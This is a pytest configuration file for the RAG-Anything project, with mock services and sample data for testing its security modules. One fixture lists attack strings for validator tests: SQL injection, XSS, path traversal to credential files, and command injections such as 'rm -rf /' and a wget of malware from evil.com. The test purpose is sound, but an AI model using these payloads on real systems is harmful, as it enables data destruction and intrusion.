"""
Pytest configuration and fixtures for RAG-Anything tests.

This module provides shared fixtures and configuration for the test suite,
including mock services, test data, and test utilities.
"""

import asyncio
import json
import tempfile
import pytest
import pytest_asyncio
from unittest.mock import Mock, AsyncMock, patch
from typing import Dict, Any, List, Optional
from pathlib import Path
import redis.asyncio as aioredis
from datetime import datetime, timedelta

# Import project modules
from raganything.backends.base import BackendConfig, BackendType
from raganything.security.input_validator import InputValidator, ValidationResult
from raganything.security.rate_limiter import RateLimitConfig, RateLimiter
from raganything.security.auth_middleware import AuthConfig, AuthenticationManager
from raganything.security.security_audit import AuditConfig, SecurityAuditor
from raganything.security.anomaly_detector import DetectionConfig, AnomalyDetector
from raganything.security.security_headers import SecurityHeadersConfig, SecurityHeadersManager


@pytest.fixture(scope="session")
def event_loop():
    """Create event loop for async tests"""
    loop = asyncio.new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
def temp_dir():
    """Provide temporary directory for tests"""
    with tempfile.TemporaryDirectory() as tmpdir:
        yield tmpdir


@pytest.fixture
def sample_text_content():
    """Sample text content for testing"""
    return """
    This is a sample document for testing purposes.
    It contains multiple paragraphs with various content.
    
    The document includes:
    - Text processing capabilities
    - Document parsing features
    - Knowledge graph integration
    
    This content will be used to test the RAG-Anything system.
    """


@pytest.fixture
def sample_multimodal_content():
    """Sample multimodal content for testing"""
    return {
        'text': 'Sample document text content',
        'tables': [
            {
                'headers': ['Name', 'Value', 'Type'],
                'rows': [
                    ['Item 1', '100', 'Number'],
                    ['Item 2', '200', 'Number']
                ]
            }
        ],
        'images': [
            {
                'path': 'image1.jpg',
                'caption': 'Sample image caption',
                'description': 'A sample image for testing'
            }
        ],
        'metadata': {
            'filename': 'test_document.pdf',
            'page_count': 3,
            'created_at': datetime.now().isoformat()
        }
    }


@pytest.fixture
def sample_security_events():
    """Sample security events for testing"""
    return [
        {
            'event_type': 'auth_success',
            'user_id': 'user123',
            'username': 'testuser',
            'ip_address': '192.168.1.1',
            'timestamp': datetime.now().isoformat(),
            'details': {'auth_method': 'api_key'}
        },
        {
            'event_type': 'auth_failure',
            'username': 'hacker',
            'ip_address': '10.0.0.1',
            'timestamp': datetime.now().isoformat(),
            'details': {'failure_reason': 'Invalid credentials'}
        },
        {
            'event_type': 'data_access',
            'user_id': 'user123',
            'username': 'testuser',
            'ip_address': '192.168.1.1',
            'endpoint': '/api/query',
            'timestamp': datetime.now().isoformat(),
            'details': {'resource': 'documents', 'action': 'query'}
        }
    ]


@pytest.fixture
async def mock_redis():
    """Mock Redis client for testing"""
    redis_mock = AsyncMock(spec=aioredis.Redis)
    redis_mock.ping.return_value = True
    redis_mock.get.return_value = None
    redis_mock.set.return_value = True
    redis_mock.setex.return_value = True
    redis_mock.delete.return_value = 1
    redis_mock.keys.return_value = []
    redis_mock.zadd.return_value = 1
    redis_mock.zcard.return_value = 0
    redis_mock.zrange.return_value = []
    redis_mock.zrangebyscore.return_value = []
    redis_mock.zremrangebyscore.return_value = 0
    redis_mock.hset.return_value = 1
    redis_mock.pipeline.return_value = redis_mock
    redis_mock.execute.return_value = [True, 0]
    return redis_mock


@pytest.fixture
def backend_config(temp_dir):
    """Backend configuration for testing"""
    return BackendConfig(
        backend_type=BackendType.LIGHTRAG,
        working_dir=temp_dir,
        max_concurrent_operations=5
    )


@pytest.fixture
def input_validator():
    """Input validator instance for testing"""
    return InputValidator(
        max_text_length=10000,
        max_file_size=10 * 1024 * 1024  # 10MB
    )


@pytest.fixture
def rate_limit_config():
    """Rate limiting configuration for testing"""
    return RateLimitConfig(
        requests_per_minute=10,
        requests_per_hour=100,
        requests_per_day=1000,
        burst_limit=5
    )


@pytest.fixture
async def rate_limiter(rate_limit_config, mock_redis):
    """Rate limiter instance for testing"""
    return RateLimiter(rate_limit_config, mock_redis)


@pytest.fixture
def auth_config():
    """Authentication configuration for testing"""
    return AuthConfig(
        jwt_secret="test-secret-key",
        jwt_expiry_minutes=30,
        max_login_attempts=3,
        lockout_duration_minutes=5
    )


@pytest.fixture
async def auth_manager(auth_config, mock_redis):
    """Authentication manager for testing"""
    return AuthenticationManager(auth_config, mock_redis)


@pytest.fixture
def audit_config(temp_dir):
    """Audit configuration for testing"""
    return AuditConfig(
        log_file_path=f"{temp_dir}/test_audit.log",
        log_retention_days=7,
        enable_file_logging=True,
        enable_real_time_alerts=True
    )


@pytest.fixture
async def security_auditor(audit_config, mock_redis):
    """Security auditor for testing"""
    auditor = SecurityAuditor(audit_config, mock_redis)
    await auditor.initialize()
    yield auditor
    await auditor.finalize()


@pytest.fixture
def detection_config():
    """Anomaly detection configuration for testing"""
    return DetectionConfig(
        enable_detection=True,
        detection_window_hours=24,
        baseline_window_days=30,
        statistical_threshold=2.5,
        volume_threshold_multiplier=3.0
    )


@pytest.fixture
async def anomaly_detector(detection_config, mock_redis):
    """Anomaly detector for testing"""
    return AnomalyDetector(detection_config, mock_redis)


@pytest.fixture
def security_headers_config():
    """Security headers configuration for testing"""
    return SecurityHeadersConfig(
        enable_hsts=True,
        enable_csp=True,
        enable_frame_options=True
    )


@pytest.fixture
def security_headers_manager(security_headers_config):
    """Security headers manager for testing"""
    return SecurityHeadersManager(security_headers_config)


@pytest.fixture
def mock_llm_model():
    """Mock LLM model for testing"""
    mock_model = AsyncMock()
    mock_model.acomplete.return_value = "Test LLM response"
    return mock_model


@pytest.fixture
def mock_embedding_model():
    """Mock embedding model for testing"""
    mock_model = AsyncMock()
    mock_model.get_embedding.return_value = [0.1, 0.2, 0.3, 0.4, 0.5]
    return mock_model


@pytest.fixture
def mock_vision_model():
    """Mock vision model for testing"""
    mock_model = AsyncMock()
    mock_model.analyze_image.return_value = "Test image analysis result"
    return mock_model


@pytest.fixture
async def mock_lightrag_backend(backend_config):
    """Mock LightRAG backend for testing"""
    from raganything.backends.lightrag_adapter import LightRAGAdapter
    
    with patch('raganything.backends.lightrag_adapter.LightRAG') as mock_lightrag:
        # Configure mock
        mock_instance = AsyncMock()
        mock_lightrag.return_value = mock_instance
        
        mock_instance.insert.return_value = None
        mock_instance.query.return_value = "Test query response"
        
        # Create adapter
        adapter = LightRAGAdapter(backend_config)
        await adapter.initialize()
        
        yield adapter
        
        await adapter.finalize()


@pytest.fixture
def mock_graphiti_client():
    """Mock Graphiti client for comprehensive testing"""
    import uuid
    from unittest.mock import Mock, AsyncMock
    
    mock_client = AsyncMock()
    
    # Mock initialization methods
    mock_client.build_indices_and_constraints = AsyncMock()
    mock_client.close = AsyncMock()
    
    # Mock episode addition with realistic results
    mock_episode_result = Mock()
    mock_episode_result.episode = Mock()
    mock_episode_result.episode.uuid = str(uuid.uuid4())
    mock_episode_result.episode.group_id = "test_group"
    mock_episode_result.episode.name = "Test Episode"
    mock_episode_result.nodes = [Mock() for _ in range(3)]
    mock_episode_result.edges = [Mock() for _ in range(2)]
    mock_episode_result.communities = [Mock()]
    
    mock_client.add_episode = AsyncMock(return_value=mock_episode_result)
    
    # Mock search with realistic results
    mock_search_result = Mock()
    mock_search_result.edges = []
    mock_search_result.nodes = []
    mock_search_result.episodes = []
    mock_search_result.communities = []
    mock_search_result.edge_reranker_scores = []
    mock_search_result.node_reranker_scores = []
    mock_search_result.episode_reranker_scores = []
    mock_search_result.community_reranker_scores = []
    
    # Add realistic search results
    for i in range(3):
        edge = Mock()
        edge.uuid = str(uuid.uuid4())
        edge.fact = f"Test fact {i+1}"
        edge.name = f"Test relationship {i+1}"
        edge.source_uuid = str(uuid.uuid4())
        edge.target_uuid = str(uuid.uuid4())
        edge.group_id = "test_group"
        edge.created_at = datetime.now()
        edge.episodes = []
        mock_search_result.edges.append(edge)
        mock_search_result.edge_reranker_scores.append(0.9 - i * 0.1)
        
        node = Mock()
        node.uuid = str(uuid.uuid4())
        node.name = f"Test Entity {i+1}"
        node.summary = f"Summary of entity {i+1}"
        node.labels = ["Entity"]
        node.group_id = "test_group"
        node.created_at = datetime.now()
        node.name_embedding = [0.1] * 512
        mock_search_result.nodes.append(node)
        mock_search_result.node_reranker_scores.append(0.9 - i * 0.1)
    
    mock_client.search_ = AsyncMock(return_value=mock_search_result)
    
    # Mock other methods
    mock_client.retrieve_episodes = AsyncMock(return_value=[])
    mock_client.build_communities = AsyncMock(return_value=([], []))
    
    return mock_client


@pytest.fixture
async def mock_graphiti_backend(backend_config, mock_graphiti_client):
    """Mock Graphiti Direct backend for testing"""
    from raganything.backends.graphiti_direct import GraphitiDirectBackend
    
    with patch('raganything.backends.graphiti_direct.GRAPHITI_AVAILABLE', True):
        with patch('raganything.backends.graphiti_direct.Graphiti', return_value=mock_graphiti_client):
            # Configure backend for testing
            graphiti_config = backend_config.backend_kwargs.get('graphiti_config', {})
            backend_config.backend_type = BackendType.GRAPHITI
            backend_config.backend_kwargs = {
                'graphiti_config': {
                    'graph_provider': 'falkordb',
                    'falkordb_host': 'localhost',
                    'falkordb_port': 6379,
                    'falkordb_database': 'test_db',
                    'llm_provider': 'openai',
                    'llm_model': 'gpt-4o-mini',
                    'llm_api_key': 'test_key',
                    'embedder_provider': 'openai',
                    'embedder_model': 'text-embedding-3-small',
                    'embedder_api_key': 'test_key',
                    'default_group_id': 'test_group',
                    **graphiti_config
                }
            }
            
            backend = GraphitiDirectBackend(backend_config)
            await backend.initialize()
            
            yield backend
            
            await backend.finalize()


@pytest.fixture
def test_files(temp_dir):
    """Create test files for document processing"""
    test_files_dir = Path(temp_dir) / "test_files"
    test_files_dir.mkdir()
    
    # Create sample text file
    text_file = test_files_dir / "sample.txt"
    text_file.write_text("This is a sample text file for testing.")
    
    # Create sample JSON file
    json_file = test_files_dir / "sample.json"
    json_file.write_text(json.dumps({"test": "data", "number": 42}))
    
    # Create sample CSV file
    csv_file = test_files_dir / "sample.csv"
    csv_file.write_text("name,value,type\nItem1,100,Number\nItem2,200,String")
    
    return {
        "text_file": str(text_file),
        "json_file": str(json_file),
        "csv_file": str(csv_file),
        "directory": str(test_files_dir)
    }


@pytest.fixture
def validation_test_cases():
    """Test cases for input validation"""
    return {
        "valid_cases": [
            {"query": "What is artificial intelligence?"},
            {"email": "user@example.com"},
            {"limit": 10, "offset": 0},
            {"metadata": {"key": "value", "number": 42}},
            {"files": ["file1.txt", "file2.pdf"]},
        ],
        "invalid_cases": [
            {"query": "DROP TABLE users;"},  # SQL injection
            {"query": "<script>alert('xss')</script>"},  # XSS
            {"email": "invalid-email"},  # Invalid email
            {"limit": -1},  # Negative number
            {"file_path": "../../../etc/passwd"},  # Path traversal
            {"api_key": "test"},  # Weak API key
        ],
        "edge_cases": [
            {"query": ""},  # Empty string
            {"query": None},  # Null value
            {"query": "A" * 100000},  # Very long string
            {"metadata": {}},  # Empty dict
            {"files": []},  # Empty list
        ]
    }


@pytest.fixture
def rate_limit_test_scenarios():
    """Test scenarios for rate limiting"""
    return {
        "normal_usage": {
            "requests": [
                {"timestamp": 0, "cost": 1},
                {"timestamp": 1, "cost": 1},
                {"timestamp": 2, "cost": 1},
            ],
            "expected_allowed": [True, True, True]
        },
        "burst_usage": {
            "requests": [
                {"timestamp": 0, "cost": 5},  # Use up burst
                {"timestamp": 0.1, "cost": 1},  # Should be rejected
            ],
            "expected_allowed": [True, False]
        },
        "gradual_usage": {
            "requests": [
                {"timestamp": 0, "cost": 1},
                {"timestamp": 10, "cost": 1},
                {"timestamp": 20, "cost": 1},
                {"timestamp": 30, "cost": 1},
            ],
            "expected_allowed": [True, True, True, True]
        }
    }


@pytest.fixture
def performance_test_data():
    """Data for performance testing"""
    return {
        "small_document": {
            "text": "Small test document. " * 10,
            "expected_processing_time": 1.0  # seconds
        },
        "medium_document": {
            "text": "Medium test document. " * 100,
            "expected_processing_time": 5.0
        },
        "large_document": {
            "text": "Large test document. " * 1000,
            "expected_processing_time": 30.0
        },
        "concurrent_requests": {
            "count": 10,
            "max_response_time": 2.0,
            "max_total_time": 10.0
        }
    }


@pytest.fixture
def security_test_data():
    """Security test data and attack vectors"""
    return {
        "sql_injection": [
            "'; DROP TABLE users; --",
            "admin' OR '1'='1",
            "1; DELETE FROM documents",
            "UNION SELECT password FROM users"
        ],
        "xss_payloads": [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
        ],
        "command_injection": [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget http://evil.com/malware",
            "`whoami`"
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc//passwd"
        ]
    }


# Test utilities

def assert_validation_result(result: ValidationResult, should_be_valid: bool = True):
    """Assert validation result properties"""
    assert isinstance(result, ValidationResult)
    assert result.is_valid == should_be_valid
    if should_be_valid:
        assert len(result.errors) == 0
        assert result.sanitized_data is not None
    else:
        assert len(result.errors) > 0


def create_mock_request(method: str = "GET", path: str = "/", **kwargs):
    """Create mock request object for testing"""
    request = Mock()
    request.method = method
    request.url.path = path
    request.headers = kwargs.get('headers', {})
    request.client.host = kwargs.get('client_ip', '127.0.0.1')
    return request


def create_test_user(user_id: str = "test_user", role: str = "user"):
    """Create test user object"""
    from raganything.security.auth_middleware import User, UserRole, Permission
    
    role_enum = UserRole(role)
    permissions = {Permission.READ, Permission.WRITE, Permission.QUERY}
    
    if role == "admin":
        permissions.add(Permission.ADMIN)
        permissions.add(Permission.DELETE)
    
    return User(
        id=user_id,
        username=f"username_{user_id}",
        email=f"{user_id}@example.com",
        role=role_enum,
        permissions=permissions,
        is_active=True
    )


async def simulate_concurrent_requests(func, args_list, max_concurrency=10):
    """Simulate concurrent requests for performance testing"""
    semaphore = asyncio.Semaphore(max_concurrency)
    
    async def bounded_request(args):
        async with semaphore:
            return await func(**args)
    
    start_time = asyncio.get_event_loop().time()
    results = await asyncio.gather(
        *[bounded_request(args) for args in args_list],
        return_exceptions=True
    )
    end_time = asyncio.get_event_loop().time()
    
    return {
        "results": results,
        "total_time": end_time - start_time,
        "success_count": sum(1 for r in results if not isinstance(r, Exception)),
        "error_count": sum(1 for r in results if isinstance(r, Exception))
    }


# Pytest markers

pytestmark = pytest.mark.asyncio